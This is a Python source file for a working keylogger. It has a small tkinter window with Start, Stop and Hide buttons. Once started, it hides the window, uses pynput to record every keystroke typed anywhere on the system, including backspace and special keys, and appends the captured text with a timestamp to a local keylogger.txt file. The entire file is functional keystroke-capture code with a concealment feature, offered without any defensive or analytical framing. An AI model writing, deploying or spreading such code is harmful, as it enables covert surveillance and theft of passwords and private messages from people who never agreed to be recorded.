from tkinter import *
from pynput import keyboard
from datetime import datetime

esc = []
loggedText = ''
specialChars = []


def handleKeyPress(key):
    global loggedText
    try:
        loggedText += str(key.char)
        print(key.char)
    except AttributeError as e:
        specialChars.append(key)
        print(specialChars)
        if key == keyboard.Key.backspace:
            loggedText = loggedText[:-1]
        elif key == keyboard.Key.space:
            loggedText += ' '

        if key == keyboard.Key.esc:
            print(key)
            try:
                if len(esc) > 0:
                    tk.deiconify()
                else:
                    esc.append(key)
                    print('PRESS ESC AGAIN TO SHOW THE WINDOW')
            except:
                pass
    liveTextBox.delete(1.0,END)
    liveTextBox.insert(1.0,loggedText)
def handleKeyRelease(key):
    pass

def start_keylogger():
    tk.withdraw()
    listener = keyboard.Listener(on_press=handleKeyPress , on_release=handleKeyRelease)
    listener.start()
    # tk.destroy()

def stop_keylogger():
    onSaveTime = datetime.now().strftime('%H:%M:%S')
    print(onSaveTime)
    fileToSave = open('keylogger.txt','a')
    fileToSave.write(f'{onSaveTime} -> {loggedText}\n\n')
    fileToSave.write(f'{onSaveTime} -> {specialChars}\n\n\n')
    print(loggedText)
    fileToSave.close()
    tk.destroy()
    return False

def hide():
    print('hide')
    tk.withdraw()
tk = Tk()
tk.title('KEYLOGGER')
tk.geometry('300x300')
tk.config(background='grey')


start_button = Button(tk, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)


stop_button = Button(tk, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=5)

hide_button = Button(tk, text="Hide", command=hide)
hide_button.pack(pady=5)

liveTextBox = Text(tk)
liveTextBox.pack(pady=5)
tk.mainloop()
